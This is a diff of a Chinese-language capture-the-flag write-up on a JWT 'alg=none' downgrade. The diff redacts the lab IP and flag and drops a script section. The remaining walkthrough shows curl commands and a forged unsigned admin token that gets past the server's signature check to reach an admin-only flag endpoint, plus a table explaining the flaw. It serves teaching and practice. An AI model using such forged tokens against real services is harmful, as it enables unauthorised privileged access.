@@ -1,7 +1,7 @@
 # Q35 - 逻辑漏洞 · JWT 算法降级 (alg=none)
 
-- 实测靶机：`http://47.120.76.57:34947/`
-- FLAG：`TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}`
+- 实测靶机：`http://目标地址/`
+- FLAG：`TOGOGO-flag{}`
 
 ## 题目速览
 
@@ -30,7 +30,7 @@ return jwt.decode(token, JWT_SECRET, algorithms=[alg])
 ### 1. 登录拿对照 token（可选，确认接口在线）
 
 ```bash
-curl -X POST http://47.120.76.57:34947/api/login \
+curl -X POST http://目标地址/api/login \
   -d "username=guest&password=guest123"
 # {"ok":true,"token":"eyJhbGciOiJIUzI1NiIs...role:user 的 HS256 token"}
 ```
@@ -38,7 +38,7 @@ curl -X POST http://47.120.76.57:34947/api/login \
 ### 2. 用 guest token 访问 /api/flag → 被拒（确认权限模型）
 
 ```bash
-curl http://47.120.76.57:34947/api/flag \
+curl http://目标地址/api/flag \
   -H "Authorization: Bearer <上一步的 token>"
 # {"ok":false,"msg":"admin only"}
 ```
@@ -68,30 +68,21 @@ eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
 ```bash
 TOKEN='eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.'
 
-curl http://47.120.76.57:34947/api/me   -H "Authorization: Bearer $TOKEN"
+curl http://目标地址/api/me   -H "Authorization: Bearer $TOKEN"
 # {"ok":true,"payload":{"role":"admin","user":"admin"}}   ← 服务端接受 none
 
-curl http://47.120.76.57:34947/api/flag -H "Authorization: Bearer $TOKEN"
-# {"ok":true,"flag":"TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}"}
+curl http://目标地址/api/flag -H "Authorization: Bearer $TOKEN"
+# {"ok":true,"flag":"TOGOGO-flag{}"}
 ```
 
 ## 关键细节
 
-| 现象 | 原因 |
-| --- | --- |
-| token 末尾点丢失 → 报错 | JWT 强制 3 段式，没签名也要留分隔点 |
-| `alg:NONE` 大写仍可绕（本题） | 代码用 `alg.lower() == 'none'` |
-| 第三段签名乱填仍 ok | `verify_signature=False` 完全忽略签名段 |
-| HS256 + 改 role → `Signature verification failed` | 密钥 32 字节强随机，无爆破空间 |
-
-## 一键脚本
-
-见 `main.py`（纯标准库，无需 PyJWT）：
-
-```bash
-python3 main.py
-# [FLAG] TOGOGO-flag{f09bfb0c-7f7d-42f0-80cf-a9cc5f18db20}
-```
+| 现象                                              | 原因                                    |
+| ------------------------------------------------- | --------------------------------------- |
+| token 末尾点丢失 → 报错                           | JWT 强制 3 段式，没签名也要留分隔点     |
+| `alg:NONE` 大写仍可绕（本题）                     | 代码用 `alg.lower() == 'none'`          |
+| 第三段签名乱填仍 ok                               | `verify_signature=False` 完全忽略签名段 |
+| HS256 + 改 role → `Signature verification failed` | 密钥 32 字节强随机，无爆破空间          |
 
 ## 修复建议
 
